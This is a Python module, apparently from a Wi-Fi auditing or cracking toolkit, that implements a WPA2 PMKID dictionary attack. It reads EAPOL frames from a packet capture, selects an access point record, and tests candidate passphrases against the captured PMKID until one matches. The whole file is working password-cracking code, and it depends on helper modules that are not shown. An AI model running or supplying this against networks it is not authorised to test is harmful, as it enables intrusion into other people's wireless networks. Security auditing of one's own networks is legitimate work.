"""Attack 2 — WPA2 PMKID dictionary/mask attack.

Verifier: PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || STA_MAC)[:16].
Needs only Message 1; no full handshake required.
"""

from __future__ import annotations

import time
from typing import Iterable, Optional

from .. import crypto
from ..parse import parse_capture, HandshakeRecord
from ..result import Verdict, FOUND, EXHAUSTED, NA, ERROR
from ..select import select_record

ATTACK = "PMKID"


def run_on_record(rec: HandshakeRecord, candidates: Iterable[str],
                  ssid: Optional[str] = None) -> Verdict:
    ssid = ssid or rec.ssid
    bssid_hex = rec.bssid.hex(":")
    if not rec.has_pmkid():
        return Verdict(ATTACK, NA, ssid=ssid, bssid=bssid_hex,
                       detail="no PMKID KDE in capture")
    if ssid is None:
        return Verdict(ATTACK, ERROR, bssid=bssid_hex,
                       detail="SSID unknown (PBKDF2 salt); pass --ssid")

    aa, spa, cap = rec.pmkid_aa, rec.pmkid_spa, rec.pmkid
    start = time.time()
    tried = 0
    for pw in candidates:
        if crypto.is_probably_hex_psk(pw):
            continue
        tried += 1
        pmk = crypto.compute_pmk(pw, ssid)
        if crypto.verify_pmkid(pmk, aa, spa, cap):
            return Verdict(ATTACK, FOUND, passphrase=pw, ssid=ssid, bssid=bssid_hex,
                           tried=tried, elapsed=time.time() - start)
    return Verdict(ATTACK, EXHAUSTED, ssid=ssid, bssid=bssid_hex,
                   tried=tried, elapsed=time.time() - start)


def run(pcap_path: str, candidates: Iterable[str], ssid: Optional[str] = None,
        bssid: Optional[str] = None) -> Verdict:
    records = parse_capture(pcap_path)
    if not records:
        return Verdict(ATTACK, NA, detail="no EAPOL frames in capture")
    rec = select_record(records, "pmkid", bssid)
    if rec is None:
        return Verdict(ATTACK, NA, detail="no matching BSSID")
    return run_on_record(rec, candidates, ssid)
